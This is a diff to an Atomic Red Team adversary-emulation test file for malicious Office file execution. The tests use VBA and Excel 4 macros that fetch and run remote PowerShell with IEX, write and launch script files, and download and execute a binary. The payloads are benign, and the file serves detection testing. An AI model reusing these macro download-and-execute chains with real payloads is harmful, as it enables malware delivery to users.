@@ -1,13 +1,12 @@
 attack_technique: T1204.002
-display_name: 'User Execution: Malicious Link'
+display_name: 'User Execution: Malicious File'
 atomic_tests:
 - name: OSTap Style Macro Execution
   auto_generated_guid: 8bebc690-18c7-4549-bc98-210f7019efff
   description: |
     This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.
     Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
-
-    This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns
+    This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.
     References:
       https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader
   supported_platforms:
@@ -23,26 +22,29 @@ atomic_tests:
       type: String
       default: Word
     ms_office_version:
-      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office". Default latest version.
       type: String
-      default: "16.0"
+      default: ((Get-ChildItem Registry::HKEY_CURRENT_USER\Software\Microsoft\Office -Name | select-string -pattern "^\d+\.\d+$").line.foreach({[decimal]$_}) | Sort-Object -desc)[0]
   dependency_executor_name: powershell
   dependencies:
   - description: |
       Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
     prereq_command: |
-      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+      $ms_office_version = #{ms_office_version}
+      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\$ms_office_version) { exit 0 } else { exit 1 }
     get_prereq_command: |
       $msword = New-Object -ComObject word.application
       Stop-Process -Name WINWORD
   executor:
     command: |
       IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      $ms_office_version = #{ms_office_version}
       $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
-      Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
+      Invoke-MalDoc $macrocode "$ms_office_version" "#{ms_product}"
     cleanup_command: |
       if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }
-      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+      $ms_office_version = #{ms_office_version}
+      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\$ms_office_version\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
     name: powershell
 - name: OSTap Payload Download
   auto_generated_guid: 3f3af983-118a-4fa1-85d3-ba4daa739d80
@@ -79,31 +81,33 @@ atomic_tests:
       type: String
       default: Word
     ms_office_version:
-      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office". Default latest version.
       type: String
-      default: "16.0"
+      default: ((Get-ChildItem Registry::HKEY_CURRENT_USER\Software\Microsoft\Office -Name | select-string -pattern "^\d+\.\d+$").line.foreach({[decimal]$_}) | Sort-Object -desc)[0]
   dependency_executor_name: powershell
   dependencies:
   - description: |
       Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
     prereq_command: |
-      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+      $ms_office_version = #{ms_office_version}
+      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\$ms_office_version) { exit 0 } else { exit 1 }
     get_prereq_command: |
       $msword = New-Object -ComObject word.application
       Stop-Process -Name WINWORD
   executor:
     command: |
       IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      $ms_office_version = #{ms_office_version}
       $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
-      Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
+      Invoke-MalDoc $macrocode "$ms_office_version" "#{ms_product}"
     cleanup_command: |
-      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+      $ms_office_version = #{ms_office_version}
+      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\$ms_office_version\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
     name: powershell
 - name: OSTAP JS version
   auto_generated_guid: add560ef-20d6-4011-a937-2c340f930911
   description: |
     Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript
-
     Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
   supported_platforms:
   - windows
@@ -117,25 +121,160 @@ atomic_tests:
       type: String
       default: Word
     ms_office_version:
-      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office". Default latest version.
       type: String
-      default: "16.0"
+      default: ((Get-ChildItem Registry::HKEY_CURRENT_USER\Software\Microsoft\Office -Name | select-string -pattern "^\d+\.\d+$").line.foreach({[decimal]$_}) | Sort-Object -desc)
   dependency_executor_name: powershell
   dependencies:
   - description: |
       Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
     prereq_command: |
-      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+      $ms_office_version = #{ms_office_version}
+      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\$ms_office_version) { exit 0 } else { exit 1 }
     get_prereq_command: |
       $msword = New-Object -ComObject word.application
       Stop-Process -Name WINWORD
   executor:
     command: |
       IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      $ms_office_version = #{ms_office_version}
       $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
-      Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
+      Invoke-MalDoc $macrocode "$ms_office_version" "#{ms_product}"
     cleanup_command: |
+      $ms_office_version = #{ms_office_version}
       if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }
-      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\$ms_office_version\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
     name: powershell
+    
+- name: Office launching .bat file from AppData
+  auto_generated_guid: 9215ea92-1ded-41b7-9cd6-79f9a78397aa
+  description: Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.
+  supported_platforms:
+  - windows
+  input_arguments:
+    bat_path:
+      description: Path to malicious .bat file
+      type: String
+      default: $env:temp+"\art1204.bat"
+    ms_office_version:
+      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office". Default latest version.
+      type: string
+      default: ((Get-ChildItem Registry::HKEY_CURRENT_USER\Software\Microsoft\Office -Name | select-string -pattern "^\d+\.\d+$").line.foreach({[decimal]$_}) | Sort-Object -desc)[0]
+    ms_product:
+      description: Maldoc application Word or Excel
+      type: String
+      default: Word
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
+    prereq_command: |
+      $ms_office_version = #{ms_office_version}
+      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\$ms_office_version) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $msword = New-Object -ComObject word.application
+      Stop-Process -Name WINWORD
+  executor:
+    command: |
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      $ms_office_version = #{ms_office_version}
+      $bat_path = #{bat_path}
+      $macrocode = "   Open `"$bat_path`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $bat_path `", vbNormalFocus)`n"
+      Invoke-MalDoc $macrocode "$ms_office_version" "#{ms_product}"
+    cleanup_command: |
+      $ms_office_version = #{ms_office_version}
+      if (Test-Path (#{bat_path})) { Remove-Item (#{bat_path}) }
+      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\$ms_office_version\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+    name: powershell
+- name: Excel 4 Macro
+  auto_generated_guid: 
+  description: |
+    This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a "malicious"
+    VBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.
 
+    A note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If
+    you'd like to utilize the "=GET.WORKSPACE(26)" method, that many maldoc authors use, you will need to ensure that the User Name associated
+    with Excel matches that of the local system. This username can be found under Files -> Options -> Username
+  supported_platforms:
+  - windows
+  input_arguments:
+    ms_office_version:
+      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+      type: String
+      default: $(((Get-ChildItem Registry::HKEY_CURRENT_USER\Software\Microsoft\Office -Name | select-string -pattern "^\d+\.\d+$").line.foreach({[decimal]$_}) | Sort-Object -desc)[0])
+    download_url:
+      description: Download URL
+      type: String
+      default: "https://live.sysinternals.com/procexp.exe"
+    uname:
+      description: Username for pathing
+      type: String
+      default: $env:Username
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependent registry keys
+    prereq_command: |
+      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $xlApp = New-Object -ComObject "Excel.Application"
+      Stop-Process -Name EXCEL
+  executor:
+    command: |
+      $fname = "$env:TEMP\atomic_redteam_x4m_exec.vbs"
+      $fname1 = "$env:TEMP\procexp.exe"
+      if (Test-Path $fname) {
+        Remove-Item $fname
+        Remove-Item $fname1
+      }
+
+      $xlApp = New-Object -COMObject "Excel.Application"
+      $xlApp.Visible = $True
+      $xlApp.DisplayAlerts = $False
+      $xlBook = $xlApp.Workbooks.Add()
+      $sheet = $xlBook.Excel4MacroSheets.Add()
+
+      if ("#{uname}" -ne "") {
+        $sheet.Cells.Item(1,1) = "#{uname}"
+      } else {
+        $sheet.Cells.Item(1,1) = "=GET.WORKSPACE(26)"
+      }
+
+      $sheet.Cells.Item(2,1) = "procexp.exe"
+      $sheet.Cells.Item(3,1) = "atomic_redteam_x4m_exec.vbs"
+      $sheet.Cells.Item(4,1) = "=IF(ISNUMBER(SEARCH(`"64`",GET.WORKSPACE(1))), GOTO(A5),)"
+      $sheet.Cells.Item(5,1) = "=FOPEN(`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`", 3)"
+      $sheet.Cells.Item(6,1) = "=FWRITELN(A5, `"url = `"`"#{download_url}`"`"`")"
+      $sheet.Cells.Item(7,1) = "=FWRITELN(A5, `"`")"
+      $sheet.Cells.Item(8,1) = "=FWRITELN(A5, `"Set winHttp = CreateObject(`"`"WinHTTP.WinHTTPrequest.5.1`"`")`")"
+      $sheet.Cells.Item(9,1) = "=FWRITELN(A5, `"winHttp.Open `"`"GET`"`", url, False`")"
+      $sheet.Cells.Item(10,1) = "=FWRITELN(A5, `"winHttp.Send`")"
+      $sheet.Cells.Item(11,1) = "=FWRITELN(A5, `"If winHttp.Status = 200 Then`")"
+      $sheet.Cells.Item(12,1) = "=FWRITELN(A5, `"Set oStream = CreateObject(`"`"ADODB.Stream`"`")`")"
+      $sheet.Cells.Item(13,1) = "=FWRITELN(A5, `"oStream.Open`")"
+      $sheet.Cells.Item(14,1) = "=FWRITELN(A5, `"oStream.Type = 1`")"
+      $sheet.Cells.Item(15,1) = "=FWRITELN(A5, `"oStream.Write winHttp.responseBody`")"
+      $sheet.Cells.Item(16,1) = "=FWRITELN(A5, `"oStream.SaveToFile `"`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`"`", 2`")"
+      $sheet.Cells.Item(17,1) = "=FWRITELN(A5, `"oStream.Close`")"
+      $sheet.Cells.Item(18,1) = "=FWRITELN(A5, `"End If`")"
+      $sheet.Cells.Item(19,1) = "=FCLOSE(A5)"
+      $sheet.Cells.Item(20,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`")"
+      $sheet.Cells.Item(21,1) = "=WAIT(NOW()+`"00:00:05`")"
+      $sheet.Cells.Item(22,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`")"
+      $sheet.Cells.Item(23,1) = "=HALT()"
+      $sheet.Cells.Item(1,1).Name = "runme"
+      $xlApp.Run("runme")
+      $xlApp.Quit()
+
+      [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
+      [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
+      [System.GC]::Collect()
+      [System.GC]::WaitForPendingFinalizers()
+
+      Remove-Variable xlBook
+      Remove-Variable xlApp
+    cleanup_command: |
+      Stop-Process -Name "procexp*" -ErrorAction Ignore
+      Remove-Item "$env:TEMP\atomic_redteam_x4m_exec.vbs" -ErrorAction Ignore
+      Remove-Item "$env:TEMP\procexp.exe" -ErrorAction Ignore
+    name: powershell
